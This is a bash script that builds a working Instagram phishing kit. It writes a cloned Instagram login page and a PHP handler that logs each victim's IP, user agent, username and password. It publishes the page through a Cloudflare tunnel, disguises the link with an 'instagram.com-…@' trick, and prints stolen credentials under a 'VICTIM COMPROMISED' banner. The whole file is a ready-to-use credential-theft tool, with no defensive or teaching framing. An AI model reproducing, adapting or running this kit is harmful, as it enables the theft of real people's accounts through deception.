#!/bin/bash

# --- 1. CONFIGURATION ---
IMG_URL="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png"

# --- 2. SYSTEM SETUP ---
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
RESET='\033[0m'
BOLD='\033[1m'

# Cleanup
pkill -f php > /dev/null 2>&1
pkill -f cloudflared > /dev/null 2>&1
rm -rf auth/ cloud.log
mkdir -p auth
touch usernames.txt

# OS Check
if [ -d "/data/data/com.termux/files/usr" ]; then
    RUNNER="termux-chroot"
    if ! command -v termux-chroot &> /dev/null; then
        pkg install proot resolv-conf -y > /dev/null 2>&1
    fi
else
    RUNNER=""
fi

PORT=$((4000 + RANDOM % 5000))

# --- 3. LOADING ANIMATION ---
clear
echo -e "${GREEN}[*] INITIALIZING DUAL-SERVER MODE...${RESET}"
sleep 0.5
echo -e "${GREEN}[*] STARTING PHP LOCALHOST...    ${CYAN}OK${RESET}"
sleep 0.5
echo -e "${GREEN}[*] CONNECTING TO SATELLITE...   ${CYAN}OK${RESET}"
sleep 0.5
echo -ne "${YELLOW}[*] BOOTING SYSTEM: [${RESET}"
for i in {1..20}; do echo -ne "${RED}#"; sleep 0.05; done
echo -e "${YELLOW}] 100%${RESET}"
sleep 1
clear

# --- 4. HACKER BANNER ---
echo -e "${CYAN}╔════════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}║ ${GREEN}:: SYSTEM STATUS ::            ${RED}[ ONLINE ]${CYAN}          ║${RESET}"
echo -e "${CYAN}╠════════════════════════════════════════════════════╣${RESET}"
echo -e "${CYAN}║                                                    ║${RESET}"
echo -e "${CYAN}║         ${YELLOW}╔══════════════════════════════╗${CYAN}           ║${RESET}"
echo -e "${CYAN}║         ${YELLOW}║ ${RED}     A N U R A G   H K R    ${YELLOW}║${CYAN}           ║${RESET}"
echo -e "${CYAN}║         ${YELLOW}╚══════════════════════════════╝${CYAN}           ║${RESET}"
echo -e "${CYAN}║                                                    ║${RESET}"
echo -e "${CYAN}║   ${WHITE}MODE    : ${GREEN}DUAL SERVER (LAN + WAN)${CYAN}              ║${RESET}"
echo -e "${CYAN}║   ${WHITE}TARGET  : ${RED}INSTAGRAM${CYAN}                            ║${RESET}"
echo -e "${CYAN}║                                                    ║${RESET}"
echo -e "${CYAN}╚════════════════════════════════════════════════════╝${RESET}"
echo ""

# --- 5. HTML CODE ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
body{ background:#0b1116; color:#fff; }
.main{ display:flex; min-height:100vh; }
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }
.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; padding: 20px; }
.card h2{ font-size:20px; margin-bottom:20px; text-align: center; }
.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; }
.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
.meta{ text-align:center; margin-top:25px; opacity:.7; }
@media(max-width:900px){
    .main{ flex-direction:column; }
    .left{ display:none; } 
    .right{ width:100%; height:100vh; background:#000; align-items: center; }
    .card{ width: 100%; max-width: 350px; background: transparent; }
    .mobile-logo { display: block; width: 60px; margin: 0 auto 30px auto; }
}
@media(min-width:901px){ .mobile-logo { display: none; } }
</style>
</head>
<body>
<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br> your <span>close friends.</span></h1>
        <img class="story" src="$IMG_URL">
    </div>
    <div class="right">
        <div class="card">
            <img class="mobile-logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
            <h2 style="font-family: sans-serif;">Instagram</h2>
            <form action="login.php" method="POST">
                <input class="input" type="text" name="u" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="p" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>
            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">From<br>Meta</div>
        </div>
    </div>
</div>
</body>
</html>
EOF

# --- 6. PHP & CAPTURE LOGIC ---
cat > auth/login.php <<EOF
<?php
// Capture IP and User Agent too
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ua = \$_SERVER['HTTP_USER_AGENT'];
file_put_contents("../usernames.txt", "IP: " . \$ip . "\nUA: " . \$ua . "\nUser: " . \$_POST['u'] . "\nPass: " . \$_POST['p'] . "\nEND\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 7. AUTO START BOTH SERVERS ---

# Step A: Start PHP (Localhost)
echo -e "${BLUE}[*] LAUNCHING LOCAL SERVER (PORT $PORT)...${RESET}"
$RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
sleep 2

# Step B: Check/Download Cloudflare
if [ ! -f "cloudflared" ]; then
    echo -e "${YELLOW}[*] DOWNLOADING CLOUDFLARE ENGINE...${RESET}"
    ARCH=$(uname -m)
    if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    else
        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    fi
    chmod +x cloudflared
fi

# Step C: Start Cloudflare Tunnel
echo -e "${BLUE}[*] LAUNCHING SATELLITE TUNNEL...${RESET}"
$RUNNER ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &

# Step D: Extract Link
echo -ne "${YELLOW}[*] GENERATING SECURE LINKS... ${RESET}"
for i in {1..15}; do
    if [ -f cloud.log ]; then
        LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
        if [ ! -z "$LINK" ]; then
            break
        fi
    fi
    echo -ne "."
    sleep 2
done

# --- 8. DISPLAY LINKS ---
echo -e "\n\n${GREEN}[✔] SERVERS RUNNING SUCCESSFULLY!${RESET}"
echo -e "${CYAN}════════════════════════════════════════════════════${RESET}"
echo -e "${WHITE} [1] LOCALHOST  : ${YELLOW}http://127.0.0.1:$PORT${RESET}"
echo -e "${WHITE} [2] CLOUDFLARE : ${YELLOW}${LINK}${RESET}"
echo -e "${CYAN}════════════════════════════════════════════════════${RESET}"

# --- 9. URL MASKING ---
echo -e "${YELLOW}Want to mask the Cloudflare link? (Make it look real)${RESET}"
echo -ne "${RED}Enter custom text (e.g. verified-badge, blue-tick): ${RESET}"
read mask
echo ""

if [ ! -z "$mask" ]; then
    SHORT=${LINK#https://}
    MASKED="https://instagram.com-$mask@$SHORT"
    echo -e "${GREEN}════════════════════════════════════════════════════${RESET}"
    echo -e "${YELLOW} 🔥 YOUR PRO HACKER LINK: ${RESET}"
    echo -e "${CYAN} $MASKED ${RESET}"
    echo -e "${GREEN}════════════════════════════════════════════════════${RESET}"
fi

# --- 10. MATRIX DATA CAPTURE ---
echo ""
echo -e "${RED}[*] SYSTEM LISTENING FOR DATA...${RESET}"
echo ""

while true; do
    if [ -f usernames.txt ]; then
        if grep -q "END" usernames.txt; then
            IP=$(grep "IP:" usernames.txt | cut -d " " -f 2)
            USER=$(grep "User:" usernames.txt | cut -d " " -f 2)
            PASS=$(grep "Pass:" usernames.txt | cut -d " " -f 2)
            
            echo -e "\a"
            echo -e "${GREEN}[!] ENCRYPTED PACKET RECEIVED...${RESET}"
            sleep 0.5
            echo -e "${YELLOW}[*] DECRYPTING DATA STREAM...${RESET}"
            sleep 0.5
            
            echo -e "${CYAN}╔════════════════════════════════════════════╗${RESET}"
            echo -e "${CYAN}║           ${RED}VICTIM COMPROMISED${CYAN}               ║${RESET}"
            echo -e "${CYAN}╠════════════════════════════════════════════╣${RESET}"
            echo -e "${CYAN}║ ${WHITE}IP ADDR : ${YELLOW}$IP${CYAN}                  ║${RESET}"
            echo -e "${CYAN}║                                            ║${RESET}"
            echo -e "${CYAN}║ ${WHITE}USERNAME: ${GREEN}$USER${CYAN}          ║${RESET}"
            echo -e "${CYAN}║ ${WHITE}PASSWORD: ${RED}$PASS${CYAN}          ║${RESET}"
            echo -e "${CYAN}╚════════════════════════════════════════════╝${RESET}"
            
            rm usernames.txt
            touch usernames.txt
        fi
    fi
    sleep 1
done
